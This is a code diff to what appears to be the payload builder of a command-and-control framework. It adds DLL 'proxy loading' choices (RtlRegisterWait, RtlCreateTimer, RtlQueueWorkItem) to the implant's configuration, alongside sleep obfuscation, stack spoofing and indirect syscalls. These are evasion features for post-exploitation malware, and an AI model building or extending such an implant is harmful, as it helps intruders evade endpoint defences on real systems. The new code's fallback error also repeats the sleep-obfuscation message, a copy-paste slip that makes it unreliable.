@@ -43,6 +43,13 @@ const (
 )
 
 const (
+	PROXYLOADING_NONE             = 0
+	PROXYLOADING_RTLREGISTERWAIT  = 1
+	PROXYLOADING_RTLCREATETIMER   = 2
+	PROXYLOADING_RTLQUEUEWORKITEM = 3
+)
+
+const (
 	ARCHITECTURE_X64 = 1
 	ARCHITECTURE_X86 = 2
 )
@@ -452,6 +459,7 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 		ConfigSpawn64      string
 		ConfigSpawn32      string
 		ConfigObfTechnique int
+		ConfigProxyLoading = PROXYLOADING_NONE
 		ConfigStackSpoof   = win32.FALSE
 		ConfigSyscall      = win32.FALSE
 		err                error
@@ -629,19 +637,60 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 		return nil, errors.New("sleep Obfuscation technique is undefined")
 	}
 
+	if val, ok := b.config.Config["Proxy Loading"].(string); ok && len(val) > 0 {
+		switch val {
+		case "None (LdrLoadDll)":
+			ConfigProxyLoading = PROXYLOADING_NONE
+			if !b.silent {
+				b.SendConsoleMessage("Info", "no proxy loading technique specified (using LdrLoadDll)")
+			}
+			break
+
+		case "RtlRegisterWait":
+			ConfigProxyLoading = PROXYLOADING_RTLREGISTERWAIT
+			if !b.silent {
+				b.SendConsoleMessage("Info", "proxy loading technique: RtlRegisterWait")
+			}
+			break
+
+		case "RtlCreateTimer":
+			ConfigProxyLoading = PROXYLOADING_RTLCREATETIMER
+			if !b.silent {
+				b.SendConsoleMessage("Info", "proxy loading technique: RtlCreateTimer")
+			}
+			break
+
+		case "RtlQueueWorkItem":
+			ConfigProxyLoading = PROXYLOADING_RTLQUEUEWORKITEM
+			if !b.silent {
+				b.SendConsoleMessage("Info", "proxy loading technique: RtlQueueWorkItem")
+			}
+			break
+
+		default:
+			ConfigProxyLoading = PROXYLOADING_NONE
+			if !b.silent {
+				b.SendConsoleMessage("Info", "no proxy loading technique specified (using LdrLoadDll)")
+			}
+			break
+		}
+	} else {
+		return nil, errors.New("sleep Obfuscation technique is undefined")
+	}
+
 	// behaviour configuration (alloc/exec/spawn)
 	DemonConfig.AddInt(ConfigAlloc)
 	DemonConfig.AddInt(ConfigExecute)
 	DemonConfig.AddWString(ConfigSpawn64)
 	DemonConfig.AddWString(ConfigSpawn32)
 
-	// sleep obfuscation configuration
+	// obfuscation configuration
 	DemonConfig.AddInt(ConfigObfTechnique)
 	DemonConfig.AddInt(ConfigStackSpoof)
+	DemonConfig.AddInt(ConfigProxyLoading)
 
 	// indirect syscall enabled/disabled
 	DemonConfig.AddInt(ConfigSyscall)
-
 	// Listener Config
 	switch b.config.ListenerType {
 	case handlers.LISTENER_HTTP:
